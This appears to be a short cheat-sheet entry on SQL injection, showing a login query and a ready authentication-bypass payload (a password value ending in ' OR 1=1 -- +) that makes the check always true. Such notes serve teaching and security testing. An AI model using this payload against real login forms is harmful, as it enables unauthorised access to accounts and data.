----------------------------------
# SQL Injection

## Authentication Bypass Variant 1
### query:
SELECT * FROM users WHERE username='admin' AND password='pass'

### payload:
*username*:admin
*password*:pass' OR 1=1 -- +

**NOTE:** + is similar to space